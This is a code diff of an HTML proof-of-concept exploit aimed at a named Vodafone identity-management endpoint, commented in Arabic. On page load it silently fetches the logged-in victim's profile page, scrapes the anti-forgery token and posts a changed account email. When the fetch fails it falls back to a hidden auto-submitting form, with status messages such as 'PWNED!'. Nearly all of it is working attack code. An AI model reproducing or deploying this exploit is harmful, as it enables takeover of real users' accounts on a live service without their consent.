@@ -4,98 +4,93 @@
     <title>PoC Executing...</title>
 </head>
 <body>
-    <div id="msg">Initializing...</div>
+    <div id="msg" style="font-family: sans-serif; padding: 20px; font-weight: bold;">Initializing...</div>
 
     <script>
-        // 1. تعريف المتغيرات الأساسية أولاً
         const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
 
-        // 2. الدالة (نفس الكود اللي معك بس تأكد إنه داخل سكريبت)
         async function executePackageDoom() {
-    try {
-        document.getElementById('msg').innerText = "Step 1: Sniffing Token...";
-        
-        // سحب التوكن (GET)
-        const response = await fetch(target, { method: 'GET', credentials: 'include' });
-        const html = await response.text();
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(html, 'text/html');
-        const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
+            try {
+                document.getElementById('msg').innerText = "Step 1: Sniffing Token...";
+                
+                // 1. سحب التوكن (GET)
+                const response = await fetch(target, { method: 'GET', credentials: 'include' });
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
 
-        if (!token) {
-            document.getElementById('msg').innerText = "❌ Token missing! (Session expired?)";
-            return;
+                if (!token) {
+                    document.getElementById('msg').innerText = "❌ Token missing! (Session expired or Not Logged In)";
+                    return;
+                }
+
+                document.getElementById('msg').innerText = "Step 2: Bypassing Security & Sending Payload...";
+
+                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
+                
+                const details = {
+                    'IsEmailConfirmed': 'True',
+                    'Email': newEmail,
+                    'PhoneNumber': '',
+                    'Name': 'Xia0Checkmate',
+                    'Website': '',
+                    'Profile': '',
+                    'StreetAddress': '',
+                    'Locality': '12',
+                    'Region': '',
+                    'PostalCode': '',
+                    'Country': '',
+                    '__RequestVerificationToken': token 
+                };
+
+                // محاولة الإرسال عبر Fetch أولاً
+                let formBody = [];
+                for (let property in details) {
+                    formBody.push(encodeURIComponent(property) + "=" + encodeURIComponent(details[property]));
+                }
+                formBody = formBody.join("&");
+
+                const postRes = await fetch(target, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: formBody,
+                    credentials: 'include'
+                });
+
+                // إذا فشل الـ Fetch (CORS Block) أو أعطى 400، ننتقل للفورم الصامت
+                if (postRes.status === 400 || !postRes.ok) {
+                     document.getElementById('msg').innerText = "⚠️ Fetch blocked or 400. Launching Silent Form Hijack...";
+                     setTimeout(() => { submitSilentForm(details); }, 1500);
+                } else {
+                     document.getElementById('msg').innerHTML = "<h2 style='color:green'>✅ Success! Check account.</h2>";
+                }
+
+            } catch (err) {
+                document.getElementById('msg').innerText = "❌ Error: " + err.message;
+                // محاولة أخيرة بالفورم حتى لو صار خطأ في الـ Fetch
+                console.log("Attempting fallback form due to error...");
+            }
         }
 
-        document.getElementById('msg').innerText = "Step 2: Bypassing Security & Sending Payload...";
-
-        const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
-        
-        // بناء الـ FormData يدوياً لضمان التنسيق الصحيح 100%
-        const details = {
-            'IsEmailConfirmed': 'True',
-            'Email': newEmail,
-            'PhoneNumber': '',
-            'Name': 'Xia0Checkmate',
-            'Website': '',
-            'Profile': '',
-            'StreetAddress': '',
-            'Locality': '12',
-            'Region': '',
-            'PostalCode': '',
-            'Country': '',
-            '__RequestVerificationToken': token // التوكن المسروق
-        };
-
-        let formBody = [];
-        for (let property in details) {
-            let encodedKey = encodeURIComponent(property);
-            let encodedValue = encodeURIComponent(details[property]);
-            formBody.push(encodedKey + "=" + encodedValue);
-        }
-        formBody = formBody.join("&");
-
-        // إرسال الطلب النهائي
-        const postRes = await fetch(target, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                // أحياناً السيرفر بيطلب التوكن هون كمان (اختياري)
-                'RequestVerificationToken': token 
-            },
-            body: formBody,
-            credentials: 'include'
-        });
-
-        // إذا أعطى 400، رح نجرب طريقة الـ Form الصامت (The Silent Form)
-        if (postRes.status === 400) {
-             document.getElementById('msg').innerText = "⚠️ Fetch blocked by 400. Launching Silent Form Hijack...";
-             submitSilentForm(details);
-        } else {
-             document.getElementById('msg').innerHTML = "<h2 style='color:green'>✅ PWNED!</h2>";
+        function submitSilentForm(data) {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = target;
+            for (const key in data) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = data[key];
+                form.appendChild(input);
+            }
+            document.body.appendChild(form);
+            form.submit();
         }
 
-    } catch (err) {
-        document.getElementById('msg').innerText = "❌ Error: " + err.message;
-    }
-}
+        // --- السطر الناقص اللي بيشغل كل شي ---
+        window.onload = executePackageDoom;
 
-// دالة احتياطية في حال فشل الـ Fetch بسبب سياسات الـ CORS Strict على الـ POST
-function submitSilentForm(data) {
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = target;
-    
-    for (const key in data) {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = data[key];
-        form.appendChild(input);
-    }
-    document.body.appendChild(form);
-    form.submit();
-}
-
-    </body>
-        </html>
+    </script>
+</body>
+</html>
